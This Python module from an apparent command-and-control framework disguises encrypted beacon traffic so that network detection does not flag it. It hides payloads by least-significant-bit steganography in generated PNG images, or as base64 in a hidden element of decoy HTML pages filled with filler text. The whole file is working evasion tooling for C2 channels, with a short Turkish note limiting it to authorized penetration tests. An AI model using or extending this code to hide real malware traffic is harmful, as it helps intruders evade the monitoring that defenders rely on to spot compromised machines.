"""
C2 Traffic Entropy Obfuscation
=============================

Encrypted C2 payloads (AES-256-GCM) are uniformly high-entropy and therefore
stand out to ML-based traffic analysis, JA3/JA4 inspection and statistical
anomaly detection (e.g. "why does this TLS session carry random noise?").

This module wraps an already-encrypted payload into a *benign-looking carrier*
so the on-wire bytes resemble ordinary web traffic:

    1. LSB steganography  -> payload hidden inside a generated PNG image.
                             Looks like an innocent image download/upload.
    2. HTML carrier        -> payload embedded as base64 inside a realistic
                             web page with decoy lorem content + randomized
                             padding. Entropy/length normalized to mimic a
                             normal HTTP response.

The envelope is format-agnostic:

    MAGIC(8) | LEN(4 BE) | PAYLOAD

Both embed paths store this envelope; extract() is tolerant and returns the
input unchanged when no carrier magic is present (so mixed plaintext/stego
responses still round-trip).

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations

import base64
import hashlib
import io
import os
import random
import struct
import zlib
from typing import Tuple, Optional

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
    Image = None  # type: ignore


MAGIC = b"M0N0ENT1"
HEADER_LEN = len(MAGIC) + 4


def _looks_like_png(data: bytes) -> bool:
    """Heuristic: does `data` begin with a PNG signature?"""
    return data[:8] == b"\x89PNG\r\n\x1a\n"


class C2TrafficEntropy:
    """
    Obfuscate C2 traffic entropy by embedding encrypted payloads into
    benign carriers (PNG stego or HTML decoy pages).
    """

    def __init__(self, beacon_id: str = "", carrier: str = "auto",
                 decoy_corpus: Optional[list] = None):
        self.beacon_id = beacon_id
        self.carrier = carrier  # "auto", "png", "html"
        self._decoy = decoy_corpus or _DEFAULT_DECOY

    # ========================================================
    # PUBLIC API
    # ========================================================

    def embed(self, data: bytes, content_type_hint: str = "text/html") -> Tuple[bytes, str]:
        """
        Wrap `data` (already encrypted) into a benign carrier.

        Returns:
            (carrier_bytes, content_type)
        """
        envelope = MAGIC + struct.pack(">I", len(data)) + data

        use_png = self.carrier == "png" or (
            self.carrier == "auto" and PIL_AVAILABLE
        )
        if use_png:
            try:
                carrier = self._png_embed(envelope)
                return carrier, "image/png"
            except Exception:
                # Fall through to HTML carrier if stego fails
                pass

        return self._html_embed(envelope), content_type_hint

    def extract(self, carrier: bytes, content_type: str = "") -> bytes:
        """
        Recover the original payload from a carrier.
        Returns `carrier` unchanged if no envelope magic is found.
        """
        if not carrier:
            return carrier

        # PNG stego?
        if content_type == "image/png" or _looks_like_png(carrier):
            try:
                env = self._png_extract(carrier)
                if env and env.startswith(MAGIC):
                    return self._unwrap(env)
            except Exception:
                pass

        # HTML carrier
        env = self._html_extract(carrier)
        if env and env.startswith(MAGIC):
            return self._unwrap(env)

        return carrier

    # ========================================================
    # PNG / LSB STEGANOGRAPHY
    # ========================================================

    def _png_embed(self, envelope: bytes) -> bytes:
        if not PIL_AVAILABLE:
            raise RuntimeError("PIL not available")
        # Pad envelope to a multiple of 3 for RGB LSB embedding
        payload = envelope
        if len(payload) % 3 != 0:
            payload += b"\x00" * (3 - (len(payload) % 3))

        # Size image to hold payload at 1 LSB/channel (3 bytes / pixel)
        needed_pixels = (len(payload) * 8) // (3 * 8) + 1
        width = max(32, int(needed_pixels ** 0.5))
        height = max(32, (needed_pixels // width) + 1)

        img = Image.new("RGB", (width, height), (random.randint(0, 255),
                                                 random.randint(0, 255),
                                                 random.randint(0, 255)))
        px = img.load()

        bits = "".join(format(b, "08b") for b in payload)
        bit_idx = 0
        for y in range(height):
            for x in range(width):
                if bit_idx >= len(bits):
                    break
                r, g, b = px[x, y]
                if bit_idx < len(bits):
                    r = (r & 0xFE) | int(bits[bit_idx]); bit_idx += 1
                if bit_idx < len(bits):
                    g = (g & 0xFE) | int(bits[bit_idx]); bit_idx += 1
                if bit_idx < len(bits):
                    b = (b & 0xFE) | int(bits[bit_idx]); bit_idx += 1
                px[x, y] = (r, g, b)

        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return buf.getvalue()

    def _png_extract(self, carrier: bytes) -> bytes:
        if not PIL_AVAILABLE:
            raise RuntimeError("PIL not available")
        img = Image.open(io.BytesIO(carrier)).convert("RGB")
        px = img.load()
        width, height = img.size

        bits: list = []
        for y in range(height):
            for x in range(width):
                r, g, b = px[x, y]
                bits.append(str(r & 1))
                bits.append(str(g & 1))
                bits.append(str(b & 1))

        # Stop once we have enough bits for the envelope header
        min_bits = HEADER_LEN * 8
        bit_str = "".join(bits[:min_bits])
        header = int(bit_str, 2).to_bytes(HEADER_LEN, "big")
        if not header.startswith(MAGIC):
            return b""

        total = struct.unpack(">I", header[len(MAGIC):len(MAGIC) + 4])[0]
        total_bytes = HEADER_LEN + total
        total_bits = total_bytes * 8
        full = "".join(bits[:total_bits])
        raw = int(full, 2).to_bytes(total_bytes, "big")
        return raw.rstrip(b"\x00")

    # ========================================================
    # HTML DECOY CARRIER
    # ========================================================

    def _html_embed(self, envelope: bytes) -> bytes:
        encoded = base64.b64encode(envelope).decode()
        # Randomize chunking to vary length/entropy per beacon
        decoy = self._build_decoy_html(encoded)
        return decoy.encode("utf-8")

    def _html_extract(self, carrier: bytes) -> bytes:
        try:
            text = carrier.decode("utf-8", errors="ignore")
        except Exception:
            return b""
        marker = "data-monolith=\""
        start = text.find(marker)
        if start < 0:
            return b""
        start += len(marker)
        end = text.find("\"", start)
        if end < 0:
            return b""
        try:
            return base64.b64decode(text[start:end])
        except Exception:
            return b""

    def _build_decoy_html(self, encoded: str) -> str:
        paragraphs = random.sample(self._decoy, min(len(self._decoy), random.randint(3, 7)))
        body = "\n".join(f"    <p>{p}</p>" for p in paragraphs)
        nonce = hashlib.sha256(os.urandom(8)).hexdigest()[:16]
        return (
            "<!DOCTYPE html>\n"
            "<html lang=\"en\">\n"
            "  <head>\n"
            "    <meta charset=\"utf-8\">\n"
            f"    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n"
            f"    <title>Resource {nonce}</title>\n"
            "  </head>\n"
            "  <body>\n"
            f"{body}\n"
            f"    <!-- cache token -->\n"
            f"    <span id=\"asset\" data-monolith=\"{encoded}\" style=\"display:none\"></span>\n"
            "  </body>\n"
            "</html>\n"
        )

    # ========================================================
    # ENVELOPE HELPERS
    # ========================================================

    @staticmethod
    def _unwrap(envelope: bytes) -> bytes:
        if len(envelope) < HEADER_LEN:
            return envelope
        length = struct.unpack(">I", envelope[len(MAGIC):HEADER_LEN])[0]
        return envelope[HEADER_LEN:HEADER_LEN + length]


_DEFAULT_DECOY = [
    "The quick brown fox jumps over the lazy dog while the sun sets slowly behind the hills.",
    "System diagnostics completed successfully and all scheduled maintenance tasks reported nominal status.",
    "Please allow up to forty eight hours for the requested configuration changes to propagate across regions.",
    "Your session was synchronized with the regional edge node to improve latency for subsequent requests.",
    "Content delivery network caches were refreshed following the latest published asset revision identifier.",
    "Routine telemetry indicates nominal throughput with no degradation observed across monitored pathways.",
    "The documentation has been updated to reflect current best practices for secure deployment workflows.",
    "Background synchronization finished without errors and the local index now matches the upstream source.",
    "A new software build is available and will be applied during the next maintenance window automatically.",
    "Network connectivity was re-established after a brief interruption caused by upstream routing adjustments.",
]
